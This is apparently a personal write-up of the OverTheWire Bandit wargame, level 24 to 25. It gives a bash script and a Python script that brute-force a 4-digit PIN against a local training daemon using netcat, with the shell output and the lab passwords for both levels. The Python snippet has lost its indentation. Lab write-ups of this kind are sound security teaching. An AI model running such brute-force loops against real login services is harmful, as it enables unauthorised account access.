# Bandit Level 24 → Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

You do not need to create new connections each time

### Solution:

From the previous level, we have the password:

**Password:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

To SSH into the server, use the following command:

**Command:**

ssh [bandit24@bandit.labs.overthewire.org](mailto:bandit1@bandit.labs.overthewire.org) -p 2220

enter the password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.

bandit24@bandit:~$ mkdir /tmp/kamisama24
bandit24@bandit:~$ cd /tmp/kamisama24
bandit24@bandit:/tmp/kamisama24$ nano [pass24.sh](http://pass24.sh/)
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/kamisama24$ la -al
total 40
drwxrwxr-x   2 bandit24 bandit24  4096 Jul 18 07:32 .
drwxrwx-wt 704 root     root     32768 Jul 18 07:32 ..
bandit24@bandit:/tmp/kamisama24$ vim [file.sh](http://file.sh/) 

In file.sh:

```jsx
#!/bin/bash
pass23=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
for pin in {0000..9999}
do
echo "$pass23 $pin"
done |
nc localhost 30002
```

bandit24@bandit:/tmp/kamisama24$ ls -al
total 44
drwxrwxr-x   2 bandit24 bandit24  4096 Jul 18 07:35 .
drwxrwx-wt 710 root     root     32768 Jul 18 07:35 ..
-rw-rw-r--   1 bandit24 bandit24   126 Jul 18 07:35 [file.sh](http://file.sh/)
bandit24@bandit:/tmp/kamisama24$ chmod +x [file.sh](http://file.sh/)

bandit24@bandit:/tmp/kamisama24$ ./file.sh | grep -v "Wrong! Please enter the correct current password and pincode. Try again."
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

To know the pin code:

bandit24@bandit:/tmp/kamisama24$ ./file.sh > output.txt
bandit24@bandit:/tmp/kamisama24$ cat output.txt | grep "Wrong! Please enter the correct current password and pincode. Try again." | wc -l
3947

i.e.

bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 3947
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

Using python:

In file.py:

#!/usr/bin/python3
pass24 = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
for pin in range(0,10000):
print(pass24 + " " + str(pin).zfill(4))

bandit24@bandit:/tmp/kamisama24$ ./file.py | nc localhost 30002 | grep -v "Wrong! Please enter the correct current password and pincode. Try again."
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4